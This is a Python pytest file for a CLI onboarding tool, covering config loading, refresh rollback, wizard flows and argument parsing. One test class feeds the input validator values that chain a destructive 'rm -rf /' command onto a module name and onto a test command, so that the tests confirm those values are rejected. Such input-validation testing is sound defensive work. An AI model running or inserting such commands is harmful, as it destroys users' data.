    def test_preview_reports_unreadable_iterate_md(self, fake_project: Path) -> None:
        """A valid generated project whose ITERATE.md suddenly becomes unreadable
        must surface the read error rather than showing a misleading diff."""
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)

        def _boom(*_args, **_kwargs):
            raise OSError("I/O error on ITERATE.md")

        import iterate_cli.refresh as refresh_mod

        original_read = refresh_mod.Path.read_text
        try:
            refresh_mod.Path.read_text = _boom  # type: ignore[method-assign, assignment]
            preview = preview_refresh(fake_project)
        finally:
            refresh_mod.Path.read_text = original_read  # type: ignore[method-assign, assignment]
        assert preview["ok"] is False
        assert "Failed to read" in preview["error"]

    def test_cli_dry_run_does_not_write(self, fake_project: Path, capsys) -> None:
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)
        iterate_md = fake_project / "ITERATE.md"
        md_before = iterate_md.read_text(encoding="utf-8")
        config_before = (fake_project / "iterate.config.yaml").read_text(encoding="utf-8")

        code = cli_main(["refresh", "-p", str(fake_project), "--dry-run"])
        assert code == 0

        # No files changed.
        assert iterate_md.read_text(encoding="utf-8") == md_before
        assert (fake_project / "iterate.config.yaml").read_text(encoding="utf-8") == config_before


class TestNonInteractiveDegradation:
    """Wizards must degrade gracefully when stdin is not a terminal."""

    def test_run_wizard_returns_none_when_non_interactive(
        self, fake_project: Path, monkeypatch, capsys
    ) -> None:
        import iterate_cli.wizard as wizard_mod

        monkeypatch.setattr(wizard_mod, "_stdin_is_interactive", lambda: False)
        result = run_wizard(fake_project)
        assert result is None

    def test_first_time_wizard_not_prompted_when_non_interactive(
        self, fake_project: Path, monkeypatch, capsys
    ) -> None:
        import iterate_cli.wizard as wizard_mod

        # No ITERATE.md → first-time flow. Guard must short-circuit before
        # any prompt, so no input_func is consumed.
        monkeypatch.setattr(wizard_mod, "_stdin_is_interactive", lambda: False)
        result = run_wizard(fake_project)
        assert result is None
        captured = capsys.readouterr()
        assert "non-interactive" in captured.err.lower() or "terminal" in captured.err.lower()

    def test_run_personalize_wizard_returns_none_when_non_interactive(
        self, fake_project: Path, monkeypatch
    ) -> None:
        import iterate_cli.wizard as wizard_mod

        monkeypatch.setattr(wizard_mod, "_stdin_is_interactive", lambda: False)
        result = run_personalize_wizard(fake_project)
        assert result is None

    def test_injected_input_func_bypasses_guard(
        self, fake_project: Path, monkeypatch
    ) -> None:
        """A custom input_func means the guard is skipped (tests/automation)."""
        import iterate_cli.wizard as wizard_mod

        monkeypatch.setattr(wizard_mod, "_stdin_is_interactive", lambda: False)
        # A custom input_func (not builtins.input) must bypass the guard even
        # when stdin is non-interactive.
        assert wizard_mod._ensure_interactive(lambda _: "n") is True


class TestLoadOnboardingConfigErrorHandling:
    """Tests for load_onboarding_config error handling (I-6-2 regression)."""

    def test_returns_none_when_config_missing(self, empty_project: Path) -> None:
        """Missing config file returns None (not raises)."""
        assert load_onboarding_config(empty_project) is None

    def test_returns_none_on_invalid_yaml(
        self, fake_project: Path, capsys
    ) -> None:
        """Invalid YAML returns None and logs to stderr."""
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)

        config_path = fake_project / "iterate.config.yaml"
        config_path.write_text("dimensions: [unclosed bracket", encoding="utf-8")

        result = load_onboarding_config(fake_project)
        assert result is None
        captured = capsys.readouterr()
        assert "Failed to parse" in captured.err

    def test_returns_none_on_non_utf8_bytes(
        self, fake_project: Path, capsys
    ) -> None:
        """Non-UTF-8 bytes return None instead of raising UnicodeDecodeError.

        Regression: UnicodeDecodeError inherits ValueError, not OSError,
        so it must be caught explicitly alongside OSError.
        """
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)

        config_path = fake_project / "iterate.config.yaml"
        # Write raw invalid UTF-8 bytes (Latin-1 high bytes).
        config_path.write_bytes(b"\xff\xfe\x00invalid: [")

        result = load_onboarding_config(fake_project)
        assert result is None
        captured = capsys.readouterr()
        assert "Failed to read" in captured.err

    def test_returns_none_on_permission_denied(
        self, fake_project: Path, capsys
    ) -> None:
        """Permission-denied file returns None instead of raising OSError.

        Regression: OSError must be caught so callers fall back to defaults.
        """
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)

        config_path = fake_project / "iterate.config.yaml"
        # Remove read permission (chmod 000).
        config_path.chmod(0o000)
        try:
            result = load_onboarding_config(fake_project)
        finally:
            # Restore permission so cleanup works.
            config_path.chmod(0o644)

        assert result is None
        captured = capsys.readouterr()
        assert "Failed to read" in captured.err


class TestGetStoredFingerprints:
    """Tests for get_stored_fingerprints defensive branches (S-8-4)."""

    def test_returns_empty_when_no_onboarding_section(self) -> None:
        from iterate_cli.refresh import get_stored_fingerprints
        assert get_stored_fingerprints({}) == []

    def test_returns_empty_when_fingerprints_not_list(self) -> None:
        from iterate_cli.refresh import get_stored_fingerprints
        config = {"onboarding": {"fingerprints": "not a list"}}
        assert get_stored_fingerprints(config) == []

    def test_returns_empty_when_item_not_dict(self) -> None:
        from iterate_cli.refresh import get_stored_fingerprints
        config = {"onboarding": {"fingerprints": ["not a dict", 42]}}
        assert get_stored_fingerprints(config) == []

    def test_returns_empty_when_item_missing_path(self) -> None:
        from iterate_cli.refresh import get_stored_fingerprints
        config = {"onboarding": {"fingerprints": [{"sha256": "abc"}]}}
        assert get_stored_fingerprints(config) == []

    def test_returns_empty_when_item_missing_sha256(self) -> None:
        from iterate_cli.refresh import get_stored_fingerprints
        config = {"onboarding": {"fingerprints": [{"path": "foo.py"}]}}
        assert get_stored_fingerprints(config) == []

    def test_returns_valid_fingerprints(self) -> None:
        from iterate_cli.refresh import get_stored_fingerprints
        config = {
            "onboarding": {
                "fingerprints": [
                    {"path": "src/a.py", "sha256": "aaa"},
                    {"path": "src/b.py", "sha256": "bbb"},
                ]
            }
        }
        result = get_stored_fingerprints(config)
        assert len(result) == 2
        assert result[0] == {"path": "src/a.py", "sha256": "aaa"}
        assert result[1] == {"path": "src/b.py", "sha256": "bbb"}


class TestIncrementalRefreshAtomicity:
    """Tests for incremental_refresh atomic write and rollback (B-8-1)."""

    def test_refresh_returns_false_on_non_utf8_iterate_md(
        self, fake_project: Path, capsys
    ) -> None:
        """Non-UTF-8 ITERATE.md returns False instead of crashing."""
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)

        iterate_md = fake_project / "ITERATE.md"
        iterate_md.write_bytes(b"\xff\xfe\x00invalid utf-8")

        result = incremental_refresh(fake_project)
        assert result is False
        captured = capsys.readouterr()
        assert "Failed to read" in captured.err

    def test_refresh_rolls_back_on_config_write_failure(
        self, fake_project: Path, monkeypatch
    ) -> None:
        """If config write fails, ITERATE.md must be rolled back to original."""
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)

        iterate_md = fake_project / "ITERATE.md"
        config_path = fake_project / "iterate.config.yaml"
        md_before = iterate_md.read_text(encoding="utf-8")
        config_before = config_path.read_text(encoding="utf-8")

        # Force atomic_write to fail on the config file only.
        # atomic_write uses temp file + os.replace (not Path.write_text),
        # so monkeypatch the imported name in the refresh module.
        import iterate_cli.refresh as refresh_mod

        original_atomic_write = refresh_mod.atomic_write

        def failing_atomic_write(path, content, encoding="utf-8"):
            if path == config_path:
                raise OSError("simulated write failure")
            return original_atomic_write(path, content, encoding)

        monkeypatch.setattr(refresh_mod, "atomic_write", failing_atomic_write)

        result = incremental_refresh(fake_project)

        assert result is False

        # ITERATE.md must be restored to original content.
        md_after = iterate_md.read_text(encoding="utf-8")
        assert md_after == md_before

        # Config must also be unchanged.
        config_after = config_path.read_text(encoding="utf-8")
        assert config_after == config_before

    def test_refresh_rolls_back_on_iterate_md_write_failure(
        self, fake_project: Path, monkeypatch
    ) -> None:
        """If ITERATE.md write fails, config must remain unchanged (B-8-1)."""
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)

        iterate_md = fake_project / "ITERATE.md"
        config_path = fake_project / "iterate.config.yaml"
        config_before = config_path.read_text(encoding="utf-8")

        # Force atomic_write to fail on ITERATE.md only.
        import iterate_cli.refresh as refresh_mod

        original_atomic_write = refresh_mod.atomic_write

        def failing_atomic_write(path, content, encoding="utf-8"):
            if path == iterate_md:
                raise OSError("simulated write failure")
            return original_atomic_write(path, content, encoding)

        monkeypatch.setattr(refresh_mod, "atomic_write", failing_atomic_write)

        result = incremental_refresh(fake_project)

        assert result is False

        # ITERATE.md rollback was attempted but also failed (monkeypatch
        # still active), so it may be partially written; however, config
        # must NOT have been written at all.
        config_after = config_path.read_text(encoding="utf-8")
        assert config_after == config_before

    def test_refresh_logs_rollback_failure(
        self, fake_project: Path, monkeypatch, capsys
    ) -> None:
        """Rollback failure must be logged to stderr (M-10-1)."""
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)

        # Make ALL atomic_write calls fail — both initial write and rollback.
        import iterate_cli.refresh as refresh_mod

        def always_failing_atomic_write(path, content, encoding="utf-8"):
            raise OSError("simulated write failure")

        monkeypatch.setattr(refresh_mod, "atomic_write", always_failing_atomic_write)

        result = incremental_refresh(fake_project)

        assert result is False
        captured = capsys.readouterr()
        # Primary error must be logged.
        assert "Failed to write refresh outputs" in captured.err
        # Rollback failure must also be logged (not silently swallowed).
        assert "Rollback failed" in captured.err


class TestFullReonboardErrorHandling:
    """Tests for full_reonboard error handling (M-10-2)."""

    def test_returns_false_on_backup_failure(
        self, fake_project: Path, monkeypatch, capsys
    ) -> None:
        """If backup fails, re-onboarding aborts with False."""
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)

        # Make shutil.copy2 raise OSError.
        import iterate_cli.refresh as refresh_mod

        def failing_copy2(src, dst, *, follow_symlinks=True):
            raise OSError("simulated backup failure")

        monkeypatch.setattr(refresh_mod.shutil, "copy2", failing_copy2)

        # Backup happens before wizard runs, so wizard is never reached.
        # Pass a dummy input_func in case it's called.
        result = full_reonboard(fake_project, input_func=lambda _: "n")

        assert result == REONBOARD_FAILED
        captured = capsys.readouterr()
        assert "Backup failed" in captured.err

    def test_returns_false_on_write_failure(
        self, fake_project: Path, monkeypatch, capsys
    ) -> None:
        """If write_onboarding_outputs fails, re-onboarding returns False."""
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)

        # Mock run_wizard to return a valid OnboardingData (skip the
        # interactive flow entirely).
        import iterate_cli.refresh as refresh_mod

        def mock_wizard(project_root, input_func=None):
            return data

        monkeypatch.setattr(refresh_mod, "run_wizard", mock_wizard)

        # Force atomic_write to fail (write_onboarding_outputs uses
        # generator.atomic_write, not Path.write_text).
        import iterate_cli.generator as generator_mod

        def failing_atomic_write(path, content, encoding="utf-8"):
            raise OSError("simulated write failure")

        monkeypatch.setattr(generator_mod, "atomic_write", failing_atomic_write)

        result = full_reonboard(fake_project)

        assert result == REONBOARD_FAILED
        captured = capsys.readouterr()
        assert "Failed to write onboarding outputs" in captured.err

    def test_returns_true_on_no_changes_needed(
        self, fake_project: Path, monkeypatch
    ) -> None:
        """Returning user declines all updates → NO_CHANGES_NEEDED is handled.

        Regression: full_reonboard previously passed the NO_CHANGES_NEEDED
        sentinel straight to write_onboarding_outputs, which crashed with
        AttributeError after the old files had already been backed up.
        """
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)

        import iterate_cli.refresh as refresh_mod

        def mock_wizard(project_root, input_func=None):
            return NO_CHANGES_NEEDED

        # Ensure write_onboarding_outputs is never reached (it would crash on
        # the sentinel). If it IS called, the test fails loudly.
        monkeypatch.setattr(refresh_mod, "run_wizard", mock_wizard)
        monkeypatch.setattr(
            refresh_mod,
            "write_onboarding_outputs",
            lambda *a, **k: (_ for _ in ()).throw(AssertionError("should not write")),
        )

        result = full_reonboard(fake_project)

        assert result == REONBOARD_NO_CHANGES


class TestParseDimensionSelectionDedup:
    """Tests for _parse_dimension_selection deduplication (S-10-1)."""

    def test_duplicate_numbers_are_deduplicated(self) -> None:
        from iterate_cli.wizard import _parse_dimension_selection
        result = _parse_dimension_selection("1,2,2,3,3")
        assert result == ["correctness", "security", "performance"]

    def test_same_number_repeated_returns_single(self) -> None:
        from iterate_cli.wizard import _parse_dimension_selection
        result = _parse_dimension_selection("5,5,5,5")
        assert result == ["style-tests"]

    def test_no_duplicates_preserved_in_order(self) -> None:
        from iterate_cli.wizard import _parse_dimension_selection
        result = _parse_dimension_selection("3,1,2")
        assert result == ["performance", "correctness", "security"]


class TestManualCollectCommandsModuleValidation:
    """Tests for _manual_collect_commands module name validation (M-10-5)."""

    def test_invalid_module_name_skipped(self) -> None:
        from iterate_cli.wizard import _manual_collect_commands
        responses = iter([
            "python; rm -rf /",  # invalid module name
            "python",            # valid module name
            "ruff check src/",   # command
            "",                  # end module
            "",                  # end input
        ])
        result = _manual_collect_commands(lambda _: next(responses))
        assert "python; rm -rf /" not in result
        assert "python" in result
        assert result["python"] == ["ruff check src/"]

    def test_command_with_shell_metacharacter_is_rejected(self) -> None:
        """Commands containing shell-chaining metacharacters are rejected."""
        from iterate_cli.wizard import _manual_collect_commands
        responses = iter([
            "python",
            "pytest tests/ && rm -rf /",  # chain via &&
            "pytest tests/",              # valid
            "",                            # end module
            "",                            # end input
        ])
        result = _manual_collect_commands(lambda _: next(responses))
        assert result["python"] == ["pytest tests/"]
        assert all("&&" not in c for c in result["python"])


class TestValidateErrorMessages:
    """Tests for validate.py error message format (S-10-3)."""

    def test_fix_priority_order_error_includes_index(self) -> None:
        from validate import validate_personalization_consistency
        config = {
            "dimensions": ["correctness"],
            "personalization": {
                "fix_priority_order": ["security", "correctness", "performance"],
            },
        }
        errors = validate_personalization_consistency(config)
        assert len(errors) == 2  # "security" and "performance" are invalid
        assert "[0]" in errors[0]
        assert "security" in errors[0]
        assert "[2]" in errors[1]
        assert "performance" in errors[1]

    def test_dimension_focus_error_includes_index(self) -> None:
        from validate import validate_personalization_consistency
        config = {
            "dimensions": ["correctness"],
            "personalization": {
                "dimension_focus": [
                    {"dimension": "security", "focus": "extra focus"},
                ],
            },
        }
        errors = validate_personalization_consistency(config)
        assert len(errors) == 1
        assert "[0]" in errors[0]
        assert "security" in errors[0]


class TestValidateStderrOutput:
    """Tests for validate.py error output going to stderr (M-10-7)."""

    def test_validation_errors_go_to_stderr(self, capsys) -> None:
        # Create an invalid config file.
        import tempfile

        from validate import main
        with tempfile.NamedTemporaryFile(
            mode="w", suffix=".yaml", delete=False
        ) as f:
            f.write("dimensions: []\n")  # empty dimensions (minItems: 1)
            temp_path = f.name

        try:
            ret = main(["config", temp_path])
            assert ret == 1
            captured = capsys.readouterr()
            # Errors must go to stderr, not stdout.
            assert captured.err  # something on stderr
            # "Validation failed" should be on stderr, not stdout.
            assert "Validation failed" not in captured.out
        finally:
            Path(temp_path).unlink(missing_ok=True)


class TestLoadExistingOnboardingDataUnicode:
    """Tests for _load_existing_onboarding_data with non-UTF-8 config (B-8-2)."""

    def test_returns_none_on_non_utf8_config(
        self, fake_project: Path, capsys
    ) -> None:
        """Non-UTF-8 config returns None instead of raising UnicodeDecodeError."""
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)

        config_path = fake_project / "iterate.config.yaml"
        config_path.write_bytes(b"\xff\xfe\x00invalid: [")

        from iterate_cli.wizard import _load_existing_onboarding_data
        result = _load_existing_onboarding_data(fake_project)
        assert result is None
        captured = capsys.readouterr()
        assert "Failed to load" in captured.err


class TestLoadExistingOnboardingDataNonDictSections:
    """Non-dict nested config sections must not crash _load_existing_onboarding_data."""

    def test_non_dict_nested_sections_do_not_crash(self, fake_project: Path) -> None:
        config_path = fake_project / "iterate.config.yaml"
        config_path.write_text(
            "goal: test\natomic: oops\ngit: nope\nreviewer: 42\nreview: x\nvalidation: y\ndimensions: not-a-list",
            encoding="utf-8",
        )
        result = _load_existing_onboarding_data(fake_project)
        assert result is not None
        assert result.dimensions == []
        assert result.target_branch == "main"
        assert result.review_scope == "full"
        assert result.push_per_round is False


class TestMergePersonalizationFiltersEmptyCommands:
    """Tests for merge_personalization_into_config empty command filtering (M-8-2)."""

    def test_empty_string_commands_are_filtered(self) -> None:
        """Empty or whitespace-only commands must not appear in validation.commands."""
        from iterate_cli.personalize import (
            PersonalizationData,
            merge_personalization_into_config,
        )

        config: dict[str, Any] = {"validation": {"commands": {}}}
        data = PersonalizationData(
            extra_validation_commands={
                "python": ["ruff check src/", "", "   ", "pytest"],
            }
        )
        result = merge_personalization_into_config(config, data)
        commands = result["validation"]["commands"]["python"]
        assert "ruff check src/" in commands
        assert "pytest" in commands
        assert "" not in commands
        assert "   " not in commands

    def test_empty_commands_not_added_to_whitelist(self) -> None:
        """Empty commands must not pollute the command_whitelist."""
        from iterate_cli.personalize import (
            PersonalizationData,
            merge_personalization_into_config,
        )

        config: dict[str, Any] = {"validation": {"commands": {}}}
        data = PersonalizationData(
            extra_validation_commands={"python": ["", "   "]}
        )
        result = merge_personalization_into_config(config, data)
        # All commands were empty, so the whitelist must not be polluted with
        # junk entries; the key is dropped entirely (an explicit empty list
        # would trip doctor's "must be a non-empty list" check).
        assert "command_whitelist" not in result["validation"]


class TestFullReonboard:
    def test_creates_backup(self, fake_project: Path) -> None:
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)

        # Add user content to verify backup.
        iterate_md = fake_project / "ITERATE.md"
        iterate_md.write_text("original content", encoding="utf-8")

        # Returning user flow: update basic config, then decline personalization.
        responses = iter([
            "y",          # update basic config: yes
            "y",          # tech stack correct
            "y",          # use suggested commands
            "",           # default dimensions
            "",           # dimension sets: enable all suggested
            "",           # default branch
            "",           # default scope
            "y",          # push: yes
            "Redone",     # description
            "",           # conventions: empty
            "n",          # advanced config: no
            "y",          # confirm: yes
            "n",          # personalization offer: no
        ])
        result = full_reonboard(fake_project, input_func=lambda _: next(responses))
        assert result == REONBOARD_COMPLETED

        # Backup file exists.
        backups = list(fake_project.glob("ITERATE.md.bak-*"))
        assert len(backups) == 1
        assert backups[0].read_text(encoding="utf-8") == "original content"

    def test_cancelled_returns_false(self, fake_project: Path) -> None:
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)

        # Returning user flow: say yes to update basic config, cancel at confirmation.
        responses = iter([
            "y",          # update basic config: yes
            "y",          # tech stack correct
            "y",          # use suggested commands
            "",           # default dimensions
            "",           # dimension sets: enable all suggested
            "",           # default branch
            "",           # default scope
            "y",          # push: yes
            "Desc",       # description
            "",           # conventions: empty
            "n",          # advanced config: no
            "n",          # confirm: no (cancel)
        ])
        result = full_reonboard(fake_project, input_func=lambda _: next(responses))
        assert result == REONBOARD_CANCELLED

    def test_fails_without_existing(self, empty_project: Path) -> None:
        assert full_reonboard(empty_project) == REONBOARD_FAILED


# ---------------------------------------------------------------------------
# CLI tests
# ---------------------------------------------------------------------------

class TestCLIStatus:
    def test_status_not_onboarded(self, empty_project: Path, capsys) -> None:
        ret = cli_main(["status", "-p", str(empty_project)])
        assert ret == 0
        captured = capsys.readouterr()
        assert "Not onboarded" in captured.out

    def test_status_onboarded_no_drift(self, fake_project: Path, capsys) -> None:
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)
        ret = cli_main(["status", "-p", str(fake_project)])
        assert ret == 0
        captured = capsys.readouterr()
        assert "Onboarded" in captured.out
        assert "No drift" in captured.out

    def test_status_with_drift(self, fake_project: Path, capsys) -> None:
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)
        (fake_project / "pyproject.toml").write_text("changed", encoding="utf-8")
        ret = cli_main(["status", "-p", str(fake_project)])
        assert ret == 0
        captured = capsys.readouterr()
        assert "Drift" in captured.out

    def test_invalid_project_dir(self, capsys) -> None:
        ret = cli_main(["status", "-p", "/nonexistent/path/xyz"])
        assert ret == 1

    def test_status_personalization_rule_count_excludes_version(
        self, fake_project: Path, capsys
    ) -> None:
        """version field must be excluded from personalization rule count."""
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)

        # Inject personalization with version + structured rules.
        config_path = fake_project / "iterate.config.yaml"
        config = yaml.safe_load(config_path.read_text(encoding="utf-8")) or {}
        config["personalization"] = {
            "version": "1.0",
            "protected_paths": ["src/legacy.py"],
            "risk_areas": [{"path": "src/api/", "reason": "fragile"}],
            "known_intentional": [],
            "dimension_focus": [],
            "fix_priority_order": ["security", "correctness"],
            "forbidden_fixes": ["# noqa"],
        }
        config_path.write_text(yaml.safe_dump(config, sort_keys=False), encoding="utf-8")

        ret = cli_main(["status", "-p", str(fake_project)])
        assert ret == 0
        captured = capsys.readouterr()
        # 1 protected + 1 risk + 2 priority + 1 forbidden = 5 (version excluded)
        assert "Personalization: 5 rule(s)" in captured.out

    def test_status_personalization_includes_extra_validation_commands(
        self, fake_project: Path, capsys
    ) -> None:
        """extra_validation_commands (dict) must be counted, not skipped."""
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)

        config_path = fake_project / "iterate.config.yaml"
        config = yaml.safe_load(config_path.read_text(encoding="utf-8")) or {}
        config["personalization"] = {
            "version": "1.0",
            "protected_paths": ["src/legacy.py"],
            "extra_validation_commands": {
                "python": ["bandit -r src/", "pip-audit"],
                "node": ["npm audit"],
            },
        }
        config_path.write_text(yaml.safe_dump(config, sort_keys=False), encoding="utf-8")

        ret = cli_main(["status", "-p", str(fake_project)])
        assert ret == 0
        captured = capsys.readouterr()
        # 1 protected + 2 python cmds + 1 node cmd = 4
        assert "Personalization: 4 rule(s)" in captured.out

    def test_count_personalization_rules_empty(self) -> None:
        from iterate_cli.cli import _count_personalization_rules

        assert _count_personalization_rules({}) == 0

    def test_count_personalization_rules_only_version(self) -> None:
        """Config with only version field should count as 0 rules."""
        from iterate_cli.cli import _count_personalization_rules

        assert _count_personalization_rules({"version": "1.0"}) == 0


class TestReturningUserFlow:
    """Tests for the multi-path wizard when ITERATE.md already exists."""

    def test_skip_basic_keep_existing_config(self, fake_project: Path) -> None:
        """Returning user declines basic update and personalization → NO_CHANGES_NEEDED."""
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)

        responses = iter([
            "n",          # update basic config: no (use existing)
            "n",          # personalization: no
        ])
        result = run_wizard(fake_project, input_func=lambda _: next(responses))
        # Declining both means no changes needed; wizard returns sentinel.
        assert result is NO_CHANGES_NEEDED

    def test_update_basic_config(self, fake_project: Path) -> None:
        """Returning user updates basic config."""
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)

        responses = iter([
            "y",          # update basic config: yes
            "y",          # tech stack correct
            "y",          # use suggested commands
            "",           # default dimensions
            "",           # dimension sets: enable all suggested
            "develop",    # target branch: develop
            "",           # default scope
            "n",          # push: no
            "Updated",    # description
            "",           # conventions: empty
            "n",          # advanced config: no
            "y",          # confirm: yes
            "n",          # personalization: no
        ])
        result = run_wizard(fake_project, input_func=lambda _: next(responses))
        assert result is not None
        assert result.target_branch == "develop"
        assert result.push_per_round is False

    def test_returning_user_with_personalization(self, fake_project: Path) -> None:
        """Returning user declines basic update but accepts personalization."""
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)

        responses = iter([
            "n",          # update basic config: no
            "y",          # personalization: yes
            "y",          # start personalization
            # Step 1: protected paths
            "a",          # add
            "legacy/**",  # path
            "s",          # skip
            # Step 2: risk areas
            "s",          # skip
            # Step 3: known intentional
            "s",          # skip
            # Step 4: dimension focus
            "s",          # skip
            # Step 5: fix priority order
            "",           # skip (empty)
            # Step 6: forbidden fixes
            "s",          # skip
            # Step 7: iterate notes
            "s",          # skip
            # Step 8: code conventions
            "s",          # skip
            # Step 9: extra validation commands
            "s",          # skip
            "y",          # confirm save
        ])
        result = run_wizard(fake_project, input_func=lambda _: next(responses))
        assert result is not None
        assert result.personalization is not None
        assert "legacy/**" in result.personalization.protected_paths


class TestCLIRefresh:
    def test_refresh_not_onboarded(self, empty_project: Path, capsys) -> None:
        ret = cli_main(["refresh", "-p", str(empty_project)])
        assert ret == 1
        captured = capsys.readouterr()
        assert "not yet completed" in captured.out

    def test_refresh_success(self, fake_project: Path, capsys) -> None:
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)
        ret = cli_main(["refresh", "-p", str(fake_project)])
        assert ret == 0
        captured = capsys.readouterr()
        assert "complete" in captured.out.lower()


class TestCLIReonboard:
    def test_reonboard_not_onboarded(self, empty_project: Path, capsys) -> None:
        ret = cli_main(["reonboard", "-p", str(empty_project)])
        assert ret == 1

    def test_reonboard_cancelled_is_distinct_from_failed(self, fake_project: Path, capsys) -> None:
        # Regression: a user-cancelled re-onboard used to share the vague
        # "cancelled or failed" message with a real failure. On a non-TTY stdin
        # the wizard cannot prompt, so full_reonboard returns REONBOARD_CANCELLED
        # and the CLI must render a distinct cancellation message.
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)
        ret = cli_main(["reonboard", "-p", str(fake_project)])
        assert ret == 1
        captured = capsys.readouterr()
        assert "cancelled" in captured.out.lower()
        assert "failed" not in captured.out.lower()


class TestCLIVersion:
    def test_version_flag(self, capsys) -> None:
        # --version returns a 0 exit code via return value (not SystemExit),
        # because __main__.py wraps main() with sys.exit().
        ret = cli_main(["--version"])
        assert ret == 0
        captured = capsys.readouterr()
        assert "iterate" in captured.out

    def test_version_flag_honors_no_banner(self, capsys) -> None:
        # The ASCII banner is large; --version must honor --no-banner and the
        # ITERATE_NO_BANNER env var so quick version queries stay compact.
        capsys.readouterr()
        ret = cli_main(["--version", "--no-banner"])
        assert ret == 0
        captured = capsys.readouterr()
        assert "iterate" in captured.out
        assert "██" not in captured.out

    def test_version_flag_honors_env_no_banner(self, capsys, monkeypatch) -> None:
        monkeypatch.setenv("ITERATE_NO_BANNER", "1")
        capsys.readouterr()
        ret = cli_main(["--version"])
        assert ret == 0
        captured = capsys.readouterr()
        assert "iterate" in captured.out
        assert "██" not in captured.out

    def test_version_flag_shows_banner_by_default(self, capsys) -> None:
        capsys.readouterr()
        ret = cli_main(["--version"])
        assert ret == 0
        captured = capsys.readouterr()
        assert "██" in captured.out


class TestCLIGlobalFlagsAfterSubcommand:
    """Global flags (--no-banner, -p/--project) must work before OR after the
    subcommand, and a flag placed before the subcommand must not be clobbered
    by the subcommand parser's defaults."""

    def _parse(self, argv: list[str]):
        from iterate_cli.cli import _build_parser

        return _build_parser().parse_args(argv)

    def test_no_banner_before_subcommand_not_clobbered(self) -> None:
        args = self._parse(["--no-banner", "status"])
        assert args.no_banner is True

    def test_no_banner_after_subcommand(self) -> None:
        args = self._parse(["status", "--no-banner"])
        assert args.no_banner is True

    def test_no_banner_absent_defaults_false(self) -> None:
        args = self._parse(["status"])
        assert args.no_banner is False

    def test_project_before_subcommand_not_clobbered(self) -> None:
        args = self._parse(["-p", "/tmp/proj", "status"])
        assert args.project == "/tmp/proj"

    def test_project_after_subcommand(self) -> None:
        args = self._parse(["status", "-p", "/tmp/proj"])
        assert args.project == "/tmp/proj"

    def test_project_subcommand_wins_when_both_given(self) -> None:
        args = self._parse(["-p", "/tmp/global", "status", "-p", "/tmp/sub"])
        assert args.project == "/tmp/sub"

    def test_combo_global_and_subcommand_flags(self) -> None:
        args = self._parse(["-p", "/tmp/x", "--no-banner", "doctor", "--json"])
        assert args.project == "/tmp/x"
        assert args.no_banner is True
        assert args.json is True

    def test_project_absent_defaults_dot(self) -> None:
        args = self._parse(["status"])
        assert args.project == "."


class TestCLIGracefulInterrupt:
    """Ctrl+C / Ctrl+D during a command must cancel cleanly, not crash."""

    def test_keyboard_interrupt_returns_1(
        self, empty_project: Path, capsys, monkeypatch
    ) -> None:
        import iterate_cli.cli as cli_mod

        def boom(_root, **kwargs):
            raise KeyboardInterrupt

        monkeypatch.setattr(cli_mod, "_cmd_status", boom)
        capsys.readouterr()
        ret = cli_main(["status", "-p", str(empty_project)])
        assert ret == 1
        out = capsys.readouterr().out
        assert "Interrupted" in out or "中断" in out
        assert "Traceback" not in out

    def test_eoferror_returns_1_no_traceback(
        self, empty_project: Path, capsys, monkeypatch
    ) -> None:
        import iterate_cli.cli as cli_mod

        def boom(_root, **kwargs):
            raise EOFError

        monkeypatch.setattr(cli_mod, "_cmd_status", boom)
        capsys.readouterr()
        ret = cli_main(["status", "-p", str(empty_project)])
        assert ret == 1
        out = capsys.readouterr().out
        assert "Input ended" in out or "输入已结束" in out
        assert "Traceback" not in out


class TestCLINoCommand:
    def test_no_command_prints_help(self, capsys) -> None:
        ret = cli_main(["-p", "."])
        assert ret == 0


# ---------------------------------------------------------------------------
# PersonalizationData model tests
# ---------------------------------------------------------------------------


def _build_personalization_data() -> PersonalizationData:
    """Build a PersonalizationData with all fields populated."""
    return PersonalizationData(
        protected_paths=["legacy/**", "vendor/**"],
        risk_areas=[
            RiskArea(path="src/auth/", reason="认证模块需审批"),
            RiskArea(path="src/crypto/", reason="加密模块敏感"),
        ],
        known_intentional=[
            KnownIntentional(
                file="db/queries.py", line=42, dimension="tech-debt",
                reason="使用 any 是性能优化",
            ),
            KnownIntentional(
                file="legacy/handlers.py", line=0, dimension="style-tests",
                reason="遗留代码不强制风格",
            ),
        ],
        dimension_focus=[
            DimensionFocusOverride(dimension="security", focus="SQL 注入历史事故"),
        ],
        fix_priority_order=["security", "correctness", "performance"],
        forbidden_fixes=["try-catch 吞错", "# noqa"],
        iterate_notes=["不要修改迁移文件", "测试数据库在 CI 中自动创建"],
        code_conventions=["使用 4 空格缩进", "函数名用 snake_case"],
        extra_validation_commands={"python": ["bandit -r src/"]},
    )


class TestPersonalizationDataModel:
    def test_is_empty_true(self) -> None:
        data = PersonalizationData()
        assert data.is_empty() is True

    def test_is_empty_false_with_protected_paths(self) -> None:
        data = PersonalizationData(protected_paths=["src/"])
